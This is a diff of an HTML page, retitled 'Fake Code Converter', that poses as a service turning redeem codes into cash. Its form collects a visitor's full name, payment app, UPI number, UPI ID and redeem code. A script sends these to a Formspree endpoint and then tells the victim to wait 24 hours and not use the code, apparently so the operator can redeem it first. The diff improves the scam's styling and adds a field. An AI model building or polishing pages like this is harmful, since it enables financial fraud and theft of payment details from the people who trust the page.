@@ -1,87 +1,175 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Code to Cash Converter</title>
+  <title>Fake Code Converter</title>
   <style>
+    /* Gradient background with subtle animated pattern */
     body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 50px;
-     body {
-  font-family: Arial, sans-serif;
-  text-align: center;
-  padding: 50px;
-  
-  /* Background image */
-  background-image: url(‘https://imgur.com/gallery/AIGsYhM’); /* <- your image file */
-  background-size: cover;       /* makes it cover whole page */
-  background-position: center;  /* centers the image */
-  background-repeat: no-repeat; /* prevents tiling */
-}
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      min-height: 100vh;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+      background: linear-gradient(135deg, #6a11cb, #2575fc, #ff416c, #ff4b2b);
+      background-size: 800% 800%;
+      animation: gradientBG 20s ease infinite;
+      position: relative;
     }
+
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    /* subtle diagonal pattern overlay */
+    body::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-image: repeating-linear-gradient(
+        45deg,
+        rgba(255,255,255,0.05),
+        rgba(255,255,255,0.05) 1px,
+        transparent 1px,
+        transparent 20px
+      );
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    h1 {
+      color: white;
+      margin-bottom: 30px;
+      text-shadow: 1px 1px 5px rgba(0,0,0,0.3);
+    }
+
     textarea {
       width: 100%;
+      max-width: 500px;
       height: 80px;
       margin: 10px 0;
-      padding: 10px;
+      padding: 12px;
       font-size: 16px;
+      border-radius: 10px;
+      border: none;
+      outline: none;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+      resize: none;
+      position: relative;
+      z-index: 1;
     }
+
     button {
-      padding: 10px 20px;
+      margin-top: 20px;
+      padding: 12px 30px;
       font-size: 18px;
+      font-weight: bold;
+      color: white;
+      background: #ff4b2b;
+      border: none;
+      border-radius: 10px;
       cursor: pointer;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      transition: all 0.3s ease;
+    }
+
+    button:hover {
+      transform: translateY(-2px);
+      background: #ff416c;
+    }
+
+    /* Professional alert popup */
+    .alert-popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      color: #333;
+      padding: 25px 35px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+      font-size: 18px;
+      font-weight: bold;
+      z-index: 9999;
+      display: none;
+      text-align: center;
+      animation: popupAnim 0.3s ease;
+    }
+
+    @keyframes popupAnim {
+      0% { transform: translate(-50%, -60%); opacity: 0; }
+      100% { transform: translate(-50%, -50%); opacity: 1; }
     }
   </style>
 </head>
 <body>
-  <h1>Code to Cash Converter</h1>
+  <h1>Fill Detail Carefully</h1>
 
-  <!-- Textareas -->
+  <!-- 5 Textareas -->
   <textarea id="userText" placeholder="Your Full Name"></textarea>
-  <textarea id="msg1" placeholder="Your UPI Number"></textarea>
-  <textarea id="msg2" placeholder="Your UPI ID"></textarea>
-  <textarea id="msg3" placeholder="Redeem Code"></textarea>
+  <textarea id="msg1" placeholder="Name of Payment App You Use"></textarea>
+  <textarea id="msg2" placeholder="Your UPI Number"></textarea>
+  <textarea id="msg3" placeholder="Your UPI ID"></textarea>
+  <textarea id="msg4" placeholder="Redeem Code"></textarea>
 
-  <br>
   <button id="convertBtn">Convert</button>
 
-<script>
-document.getElementById("convertBtn").addEventListener("click", function() {
-  const data = {
-    mainText: document.getElementById("userText").value,
-    text1: document.getElementById("msg1").value,
-    text2: document.getElementById("msg2").value,
-    text3: document.getElementById("msg3").value
-  };
-// ✅ Check if any box is empty
-const text1 = document.getElementById("userText").value.trim();
-const text2 = document.getElementById("msg1").value.trim();
-const text3 = document.getElementById("msg2").value.trim();
-const text4 = document.getElementById("msg3").value.trim();
+  <!-- Professional popup -->
+  <div id="alertPopup" class="alert-popup">Enter Text First!</div>
 
-if (!text1 || !text2 || !text3 || !text4) {
-  alert("Enter Text First!");
-  return; // stop execution if any box is empty
-}
-  fetch("https://formspree.io/f/mzdabqwj", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-      "Accept": "application/json"
-    },
-    body: JSON.stringify(data)
-  }).then(() => {
-    // Replace current page with success message
-    document.body.innerHTML = `
-      <h1>Request Accepted</h1>
-      <p>Please wait for 24 hours</p>
-      <p><strong>Note:</strong> Don't use the code in this time period</p>
-    `;
-    document.body.style.textAlign = "center";
-    document.body.style.fontFamily = "Arial, sans-serif";
-    document.body.style.padding = "50px";
-    document.body.style.background = "#f0f0f0";
-  });
-});
-</script>
+  <script>
+    const alertPopup = document.getElementById("alertPopup");
+
+    document.getElementById("convertBtn").addEventListener("click", function() {
+      const text1 = document.getElementById("userText").value.trim();
+      const text2 = document.getElementById("msg1").value.trim();
+      const text3 = document.getElementById("msg2").value.trim();
+      const text4 = document.getElementById("msg3").value.trim();
+      const text5 = document.getElementById("msg4").value.trim();
+
+      // Show alert if any box is empty
+      if (!text1 || !text2 || !text3 || !text4 || !text5) {
+        alertPopup.style.display = "block";
+        setTimeout(() => {
+          alertPopup.style.display = "none";
+        }, 1800);
+        return; // stop execution
+      }
+
+      // Send data to Formspree
+      const data = {
+        mainText: text1,
+        text1: text2,
+        text2: text3,
+        text3: text4,
+        text4: text5
+      };
+
+      fetch("https://formspree.io/f/mzdabqwj", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(data)
+      }).then(() => {
+        // Replace page with "Request Accepted"
+        document.body.innerHTML = `
+          <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;text-align:center;font-family:Arial, sans-serif;color:white;background:linear-gradient(135deg,#6a11cb,#2575fc,#ff416c,#ff4b2b);padding:40px;">
+            <h1 style="font-size:36px;margin-bottom:20px;text-shadow:2px 2px 8px rgba(0,0,0,0.3)">Request Accepted</h1>
+            <p style="font-size:20px;margin:10px 0;">Please wait for 24 hours</p>
+            <p style="font-size:18px;margin:10px 0;"><strong>Note:</strong> Don't use the code in this time period</p>
+          </div>
+        `;
+      });
+    });
+  </script>
+</body>
+</html>
